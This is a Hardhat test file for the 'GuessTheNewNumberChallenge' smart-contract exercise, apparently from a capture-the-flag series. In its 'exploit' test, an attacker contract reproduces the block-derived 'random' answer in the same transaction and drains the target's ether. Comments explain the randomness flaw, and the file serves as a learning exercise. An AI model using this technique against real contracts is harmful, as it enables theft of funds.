import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */

    // Be careful: main difference with previous assignment is that the answer now is determined—dynamically at each guess in
    // GuessTheNewNumberChallenge
    // In contract: in previous assignment it was statically upon deployment in GuessTheRandomNumberChallenge.
    // In GuessTheRandomNumberChallenge: we initialized a state variable and answer was calculated at deployment
    // In GuessTheNewNumberChallenge: answer is calculated in a function guess!

    // Solution? Build an Attacker solidity file and copy its code
    // The Attacker file enables us to call the guess function at exactly the same time

    // Deploy our own Attacker contract GuessTheNewNumberChallengeAttacker
    // And use contract address from target as input
    const attackFactory = await ethers.getContractFactory('GuessTheNewNumberChallengeAttacker');
    const attackContract = await attackFactory.deploy(target.address);
    await attackContract.deployed();

    const tx = await attackContract.attack({ value: utils.parseEther('1') });
    await tx.wait();

    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
